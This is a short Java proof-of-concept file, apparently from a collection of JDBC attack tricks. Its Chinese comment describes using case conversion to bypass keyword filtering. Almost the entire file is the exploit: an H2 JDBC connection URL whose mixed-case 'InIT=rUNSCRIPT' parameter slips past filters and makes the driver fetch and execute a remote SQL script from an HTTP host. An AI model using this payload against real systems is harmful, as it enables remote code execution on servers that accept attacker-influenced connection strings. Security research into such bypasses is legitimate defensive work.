package com.jdbc.tricks;

import java.sql.Connection;
import java.sql.DriverManager;

// 利用大小写转换绕过关键字过滤，参考：https://fushuling.com/index.php/2025/06/23/%e4%bb%8e%e9%9b%b6%e5%bc%80%e5%a7%8b%e7%9a%84h2_jdbc_bypass%e4%b9%8b%e6%97%85/
public class CaseConversionBypass {
    public static void main(String[] args) throws Exception {
        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;InIT=rUNSCRIPT FROM 'http://127.0.0.1:50025/poc.sql'";
        Connection conn = DriverManager.getConnection(url);
    }
}
